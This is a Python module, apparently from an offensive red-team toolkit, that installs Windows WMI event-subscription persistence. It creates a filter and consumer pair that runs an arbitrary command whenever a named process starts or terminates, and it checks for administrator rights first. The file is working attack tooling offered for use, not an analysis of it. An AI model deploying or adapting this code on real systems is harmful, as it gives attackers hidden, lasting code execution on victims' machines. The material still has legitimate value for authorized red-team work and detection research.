"""
Process creation/deletion triggered WMI persistence
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_powershell, check_admin
from templates.powershell import generate_creation_script
from config import WQL_QUERIES

def create_process_creation_persistence(event_name, command, process_name):
    """
    Create WMI persistence that triggers on process creation
    
    Args:
        event_name (str): Event name prefix
        command (str): Command to execute
        process_name (str): Process name to monitor
        
    Returns:
        dict: Creation result
    """
    print(f"[*] Creating process creation-triggered WMI persistence...")
    print(f"[*] Monitoring process: {process_name}")
    
    if not check_admin():
        print("[!] Administrator privileges required")
        return {
            'success': False,
            'error': 'Administrator privileges required'
        }
    
    # Generate names
    filter_name = f"_{event_name}_Filter"
    consumer_name = f"_{event_name}_Consumer"
    
    # Generate WQL query
    wql_query = WQL_QUERIES['process_creation'].format(process_name=process_name)
    
    # Generate PowerShell script
    ps_script = generate_creation_script(
        filter_name=filter_name,
        consumer_name=consumer_name,
        wql_query=wql_query,
        command=command
    )
    
    # Execute script
    result = run_powershell(ps_script)
    
    if result['success']:
        print(f"[+] WMI process persistence created successfully")
        print(f"[+] Event Name: {event_name}")
        print(f"[+] Trigger: When {process_name} starts")
        
        return {
            'success': True,
            'event_name': event_name,
            'filter_name': filter_name,
            'consumer_name': consumer_name,
            'trigger_type': 'process_creation',
            'process_name': process_name,
            'command': command,
            'wql_query': wql_query
        }
    else:
        error = result.get('stderr', result.get('error', 'Unknown error'))
        print(f"[-] Failed to create WMI persistence: {error}")
        return {
            'success': False,
            'error': error
        }

def create_process_deletion_persistence(event_name, command, process_name):
    """
    Create WMI persistence that triggers on process deletion
    
    Args:
        event_name (str): Event name prefix
        command (str): Command to execute
        process_name (str): Process name to monitor
        
    Returns:
        dict: Creation result
    """
    print(f"[*] Creating process deletion-triggered WMI persistence...")
    print(f"[*] Monitoring process: {process_name}")
    
    if not check_admin():
        print("[!] Administrator privileges required")
        return {
            'success': False,
            'error': 'Administrator privileges required'
        }
    
    filter_name = f"_{event_name}_Filter"
    consumer_name = f"_{event_name}_Consumer"
    
    wql_query = WQL_QUERIES['process_deletion'].format(process_name=process_name)
    
    ps_script = generate_creation_script(
        filter_name=filter_name,
        consumer_name=consumer_name,
        wql_query=wql_query,
        command=command
    )
    
    result = run_powershell(ps_script)
    
    if result['success']:
        print(f"[+] WMI process deletion persistence created")
        print(f"[+] Trigger: When {process_name} terminates")
        
        return {
            'success': True,
            'event_name': event_name,
            'filter_name': filter_name,
            'consumer_name': consumer_name,
            'trigger_type': 'process_deletion',
            'process_name': process_name,
            'command': command,
            'wql_query': wql_query
        }
    else:
        error = result.get('stderr', result.get('error', 'Unknown error'))
        print(f"[-] Failed to create WMI persistence: {error}")
        return {
            'success': False,
            'error': error
        }